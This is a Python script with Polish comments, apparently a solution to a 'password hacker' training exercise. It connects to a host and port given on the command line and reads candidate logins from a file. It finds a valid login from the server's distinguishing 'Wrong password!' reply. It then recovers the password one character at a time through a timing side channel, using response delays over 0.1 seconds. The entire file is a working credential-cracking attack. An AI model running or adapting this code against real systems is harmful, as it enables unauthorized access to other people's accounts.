import socket
import sys
import json
import string
import time


class PasswordHacker:
    def __init__(self, host, port):
        self.server_address = (host, port)
        self.client_socket = socket.socket()
        self.client_socket.connect(self.server_address)
        self.logins = self.load_logins()

    def load_logins(self):
        # Ładowanie listy loginów z pliku
        with open('logins.txt', 'r') as file:
            return [line.strip() for line in file.readlines()]

    def find_login(self):
        # Sprawdzenie poprawności loginu
        for login in self.logins:

            message = json.dumps({"login": login, "password": "any_password"})
            self.client_socket.send(message.encode('utf-8'))
            response = self.client_socket.recv(1024).decode('utf-8')
            response_data = json.loads(response)


            if response_data["result"] == "Wrong password!":
                return login
        return None

    def find_password(self, login):
        # Szukanie hasła znak po znaku
        password = ""
        possible_characters = string.ascii_letters + string.digits
        while True:

            for char in possible_characters:
                attempt = password + char
                message = json.dumps({"login": login, "password": attempt})
                self.client_socket.send(message.encode('utf-8'))
                start = time.time()
                response = self.client_socket.recv(1024).decode('utf-8')
                end = time.time()
                response_data = json.loads(response)
                #print(end - start)
                delay = (end - start)
                if response_data["result"] == "Connection success!":
                    return attempt
                elif delay > 0.1:
                    password += char
                    break

    def hack(self):
        login = self.find_login()
        if login:
            password = self.find_password(login)
            print(json.dumps({"login": login, "password": password}))
        else:
            print("Nie udało się znaleźć loginu.")

if __name__ == "__main__":
    # Użycie adresu i portu podanych w argumentach
    host = sys.argv[1]
    port = int(sys.argv[2])
    hacker = PasswordHacker(host, port)
    hacker.hack()



